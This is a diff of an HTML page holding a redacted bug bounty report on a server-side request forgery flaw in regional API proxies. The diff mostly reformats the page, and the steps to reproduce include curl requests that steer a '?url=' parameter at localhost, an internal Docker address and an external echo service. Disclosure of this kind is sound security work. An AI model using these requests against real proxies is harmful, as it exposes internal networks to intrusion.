@@ -2,7 +2,7 @@
 <html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Regional API Proxy — SSRF Bug Bounty Report</title>
 <meta name="description" content="Redacted SSRF bug bounty report with request examples, response evidence, impact, and remediation.">
-<style>:root{--ink:#192d33;--muted:#4c6469;--green:#126651;--rule:#ccdad5;--mono:Consolas,monospace}*{box-sizing:border-box}body{margin:0;background:#f5f7f3;color:var(--ink);font:16px/1.65 system-ui,sans-serif}a{color:var(--green);text-underline-offset:4px}nav,header>div,.layout{max-width:1160px;margin:auto;padding-inline:clamp(20px,5vw,70px)}nav{display:flex;justify-content:space-between;padding-block:14px;font-size:14px}header{background:linear-gradient(110deg,#0c242a 8%,#16473d 90%);color:#fff;border-bottom:6px solid #9de4b4}header>div{padding-block:clamp(40px,6vw,78px)}header p,aside strong,figcaption{font:700 12px/1.4 var(--mono);letter-spacing:.12em;text-transform:uppercase}header p{color:#a8e7bf;margin:0 0 18px}h1{font:600 clamp(34px,5vw,64px)/1.06 Georgia,serif;letter-spacing:-.035em;max-width:24ch;margin:0;text-wrap:balance}.layout{display:grid;grid-template-columns:190px minmax(0,1fr);gap:clamp(24px,5vw,70px);padding-block:42px}aside{position:sticky;top:24px;align-self:start;border-left:2px solid var(--rule);padding-left:16px}aside strong{color:var(--muted)}aside a{display:block;text-decoration:none;padding:5px 0;font-size:14px}aside a:hover{text-decoration:underline}details{background:#e7efe9;padding:12px 18px;border-radius:5px;color:var(--muted)}summary{cursor:pointer;font-weight:650}section{padding:20px 0;border-bottom:1px solid var(--rule);scroll-margin-top:18px}h2{font:600 30px/1.15 Georgia,serif;margin:12px 0 18px}ul,ol{padding-left:1.6rem}code{font: .9em/1.65 var(--mono);overflow-wrap:anywhere}p code,li code{background:#e4ece7;border-radius:3px;padding:2px 4px}figure{margin:10px 0 24px;border-radius:8px;overflow:hidden;border:1px solid #294447;background:#122a30;color:#e7f3ed}figcaption{background:#203e43;color:#ade2cb;padding:8px 16px}pre{margin:0;padding:16px;white-space:pre-wrap;overflow-wrap:anywhere}.response{background:#fff;color:#1c3930;border-color:#bdcfc4}.response figcaption{background:#deece1;color:#24553c}#summary p{font-size:18px}a:focus-visible,summary:focus-visible{outline:3px solid #3983b1}@media(max-width:740px){.layout{display:block;padding-block:18px}aside{position:static;margin-bottom:20px}aside a{display:inline-block;margin-right:14px}aside strong{display:block}}@media(prefers-color-scheme:dark){:root{--ink:#e1ece4;--muted:#aec3b9;--green:#9eddbd;--rule:#3b514a}body{background:#13201e}details,p code,li code{background:#243631}.response{background:#20362e;color:#e2ede5}.response figcaption{background:#334c40;color:#d2ebdb}}</style></head><body><nav><a href="../../">← Portfolio</a><a href="report.md">Markdown report</a></nav><header><div><p>Bug Bounty Report</p><h1>SSRF on Regional API Endpoints Allows Internal Network Access</h1></div></header><div class="layout"><aside aria-label="Report contents"><strong>Contents</strong><a href="#summary">Summary</a><a href="#vulnerability-type">Vulnerability Type</a><a href="#affected-endpoints">Affected Endpoints</a><a href="#description">Description</a><a href="#steps-to-reproduce">Steps to Reproduce</a><a href="#impact">Impact</a><a href="#additional-findings">Additional Findings</a><a href="#recommended-fix">Recommended Fix</a></aside><main><details><summary>Publication note</summary><p>Target domains, internal addresses and service ports, diagnostic paths, application identity, timestamps, error prefixes, and software versions have been replaced with placeholders or representative values. The request structure and response evidence are preserved. Loopback and private addresses below are illustrative; they do not disclose the target network.</p></details><section id="summary"><h2>Summary</h2>
+<style>:root{--ink:#192d33;--muted:#4c6469;--green:#126651;--rule:#ccdad5;--mono:Consolas,monospace}*{box-sizing:border-box}body{margin:0;background:#f5f7f3;color:var(--ink);font:16px/1.65 system-ui,sans-serif}a{color:var(--green);text-underline-offset:4px}nav,header>div,.layout{max-width:1160px;margin:auto;padding-inline:clamp(20px,5vw,70px)}nav{display:flex;justify-content:space-between;padding-block:14px;font-size:14px}header{background:linear-gradient(110deg,#0c242a 8%,#16473d 90%);color:#fff;border-bottom:6px solid #9de4b4}header>div{padding-block:clamp(40px,6vw,78px)}header p,aside strong,figcaption{font:700 12px/1.4 var(--mono);letter-spacing:.12em;text-transform:uppercase}header p{color:#a8e7bf;margin:0 0 18px}h1{font:600 clamp(34px,5vw,64px)/1.06 Georgia,serif;letter-spacing:-.035em;max-width:24ch;margin:0;text-wrap:balance}.layout{display:grid;grid-template-columns:190px minmax(0,1fr);gap:clamp(24px,5vw,70px);padding-block:42px}aside{position:sticky;top:24px;align-self:start;border-left:2px solid var(--rule);padding-left:16px}aside strong{color:var(--muted)}aside a{display:block;text-decoration:none;padding:5px 0;font-size:14px}aside a:hover{text-decoration:underline}details{background:#e7efe9;padding:12px 18px;border-radius:5px;color:var(--muted)}summary{cursor:pointer;font-weight:650}section{padding:20px 0;border-bottom:1px solid var(--rule);scroll-margin-top:18px}h2{font:600 30px/1.15 Georgia,serif;margin:12px 0 18px}ul,ol{padding-left:1.6rem}code{font: .9em/1.65 var(--mono);overflow-wrap:anywhere}p code,li code{background:#e4ece7;border-radius:3px;padding:2px 4px}figure{margin:10px 0 24px;border-radius:8px;overflow:hidden;border:1px solid #294447;background:#122a30;color:#e7f3ed}figcaption{background:#203e43;color:#ade2cb;padding:8px 16px}pre{margin:0;padding:16px;white-space:pre-wrap;overflow-wrap:anywhere}.response{background:#fff;color:#1c3930;border-color:#bdcfc4}.response figcaption{background:#deece1;color:#24553c}#summary p{font-size:18px}a:focus-visible,summary:focus-visible{outline:3px solid #3983b1}@media(max-width:740px){.layout{display:block;padding-block:18px}aside{position:static;margin-bottom:20px}aside a{display:inline-block;margin-right:14px}aside strong{display:block}}@media(prefers-color-scheme:dark){:root{--ink:#e1ece4;--muted:#aec3b9;--green:#9eddbd;--rule:#3b514a}body{background:#13201e}details,p code,li code{background:#243631}.response{background:#20362e;color:#e2ede5}.response figcaption{background:#334c40;color:#d2ebdb}}.exchange{margin:1.6rem 0;padding:0 0 .6rem 1rem;border-left:3px solid var(--rule)}.exchange h3{font-size:1.05rem}.exchange figure{margin:8px 0}</style></head><body><nav><a href="../../">← Portfolio</a><a href="report.md">Markdown report</a></nav><header><div><p>Bug Bounty Report</p><h1>SSRF on Regional API Endpoints Allows Internal Network Access</h1></div></header><div class="layout"><aside aria-label="Report contents"><strong>Contents</strong><a href="#summary">Summary</a><a href="#vulnerability-type">Vulnerability Type</a><a href="#affected-endpoints">Affected Endpoints</a><a href="#description">Description</a><a href="#steps-to-reproduce">Steps to Reproduce</a><a href="#impact">Impact</a><a href="#additional-findings">Additional Findings</a><a href="#recommended-fix">Recommended Fix</a></aside><main><details><summary>Publication note</summary><p>Target domains, internal addresses and service ports, diagnostic paths, application identity, timestamps, error prefixes, and software versions have been replaced with placeholders or representative values. The request structure and response evidence are preserved. Loopback and private addresses below are illustrative; they do not disclose the target network.</p></details><section id="summary"><h2>Summary</h2>
 <p>The regional API endpoints (<code>region-a-api.example.com</code>, <code>region-b-api.example.com</code>) are vulnerable to Server-Side Request Forgery (SSRF) via the root proxy parameter (<code>?url=</code>). Unlike production (<code>api.example.com</code>), the regional instances do not enforce a host allowlist, enabling access to localhost and internal Docker network services.</p>
 </section>
 <section id="vulnerability-type"><h2>Vulnerability Type</h2>
@@ -27,27 +27,17 @@
 </ol>
 </section>
 <section id="steps-to-reproduce"><h2>Steps to Reproduce</h2>
-<ol>
-<li>Send a request to the region A endpoint with a localhost URL:</li>
-</ol>
-<figure class="request"><figcaption>Request</figcaption><pre><code>
+<article class="exchange"><h3>Step 1. Send a request to the region A endpoint with a localhost URL</h3><figure class="request"><figcaption>Request</figcaption><pre><code>
 curl &quot;https://region-a-api.example.com/?url=http://127.0.0.1:8080/&quot;
 
-</code></pre></figure>
-<p>Expected vulnerable response:</p>
-<figure class="response"><figcaption>Response</figcaption><pre><code>
+</code></pre></figure><figure class="response"><figcaption>Expected vulnerable response</figcaption><pre><code>
 {&quot;message&quot;:&quot;[REDACTED-APP] is active!&quot;,&quot;js&quot;:&quot;[REDACTED-TIMESTAMP]&quot;}
 
-</code></pre></figure>
-<ol>
-<li>Send a request to the region A endpoint with the internal Docker bridge URL:</li>
-</ol>
-<figure class="request"><figcaption>Request</figcaption><pre><code>
+</code></pre></figure></article>
+<article class="exchange"><h3>Step 2. Send a request to the region A endpoint with the internal Docker bridge URL</h3><figure class="request"><figcaption>Request</figcaption><pre><code>
    https://region-a-api.example.com/?url=http://10.0.0.10:22/
 
-</code></pre></figure>
-<p> Response:</p>
-<figure class="response"><figcaption>Response</figcaption><pre><code>
+</code></pre></figure><figure class="response"><figcaption>Response</figcaption><pre><code>
    {
 
      &quot;message&quot;: &quot;[REDACTED-PREFIX]: ClientResponseError: ... Expected HTTP/, RTSP/ or ICE/:
@@ -60,31 +50,21 @@ curl &quot;https://region-a-api.example.com/?url=http://127.0.0.1:8080/&quot;
 
    }
 
-</code></pre></figure>
-<ol>
-<li>Confirm external SSRF behavior:</li>
-</ol>
-<figure class="request"><figcaption>Request</figcaption><pre><code>
+</code></pre></figure></article>
+<article class="exchange"><h3>Step 3. Confirm external SSRF behavior</h3><figure class="request"><figcaption>Request</figcaption><pre><code>
 curl &quot;https://region-a-api.example.com/?url=https://httpbin.org/ip&quot;
 
-</code></pre></figure>
-<p>Response:</p>
-<figure class="response"><figcaption>Response</figcaption><pre><code>
+</code></pre></figure><figure class="response"><figcaption>Response</figcaption><pre><code>
 {&quot;origin&quot;:&quot;[REDACTED-PUBLIC-IP]&quot;}
 
-</code></pre></figure>
-<ol>
-<li>Compare with production behavior (blocked):</li>
-</ol>
-<figure class="request"><figcaption>Request</figcaption><pre><code>
+</code></pre></figure></article>
+<article class="exchange"><h3>Step 4. Compare with production behavior (blocked)</h3><figure class="request"><figcaption>Request</figcaption><pre><code>
 curl &quot;https://api.example.com/?url=http://127.0.0.1:8080/&quot;
 
-</code></pre></figure>
-<p>Response:</p>
-<figure class="response"><figcaption>Response</figcaption><pre><code>
+</code></pre></figure><figure class="response"><figcaption>Response</figcaption><pre><code>
 {&quot;message&quot;:&quot;[REDACTED-APP] Proxy: Host not allowed&quot;}
 
-</code></pre></figure>
+</code></pre></figure></article>
 </section>
 <section id="impact"><h2>Impact</h2>
 <ul>
